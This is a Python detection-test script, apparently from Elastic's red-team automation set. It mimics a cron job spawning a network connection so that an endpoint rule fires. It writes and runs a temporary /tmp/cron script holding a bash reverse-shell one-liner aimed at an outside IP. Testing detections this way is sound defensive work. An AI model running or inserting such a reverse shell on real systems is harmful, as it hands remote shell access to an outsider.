# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata

metadata = RtaMetadata(
    uuid="6363ac15-1267-4fd7-a384-831e51342230",
    platforms=["linux"],
    endpoint=[
        {
            "rule_name": "Cron Execution Followed by Network Connection",
            "rule_id": "0860e21a-8a95-4be9-837a-164334efae36"
        }
    ],
    techniques=["T1053", "T1059", "T1071"],
)


@common.requires_os(*metadata.platforms)
def main():

    shell_command = "/bin/bash"
    shell_args = "-c 'sh -i >& /dev/tcp/8.8.8.8/53 0>&1'"
    parent_process = "/tmp/cron"

    # Create the fake parent process script
    with open(parent_process, "w") as script:
        script.write("#!/bin/bash\n")
        script.write(f"{shell_command} {shell_args}\n")

    # Make the script executable
    common.execute(['chmod', '+x', parent_process])

    # Execute the fake parent process script
    common.log("Executing the fake parent process script")
    common.execute([parent_process])
    common.log("RTA execution completed.")

    # Cleanup
    common.remove_file(parent_process)


if __name__ == "__main__":
    exit(main())
